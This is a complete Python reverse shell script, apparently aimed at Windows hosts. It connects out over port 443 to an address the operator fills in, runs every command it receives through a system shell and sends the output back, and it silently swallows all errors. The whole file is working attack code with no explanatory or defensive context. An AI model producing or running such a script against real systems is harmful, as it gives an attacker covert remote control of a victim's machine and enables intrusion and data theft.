#!/usr/bin/env python3

import socket
import subprocess   

def run_command(command):
    try:
        return subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode("cp850").strip()
    except subprocess.CalledProcessError as e:
        return f"Error executing command: {e.output.decode('cp850').strip()}"
    except Exception as e:
        return f"Unexpected error: {str(e)}"

if __name__ == '__main__':
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
            client_socket.connect(("192.168.1.X", 443)) # Your IP
            
            while True:
                command = client_socket.recv(1024).decode().strip()
                if not command:
                    break
                
                command_output = run_command(command)
                client_socket.send(b"\n" + command_output.encode("cp850") + b"\n")
    except ConnectionRefusedError:
        pass
    except KeyboardInterrupt:
        pass
    except:
        pass
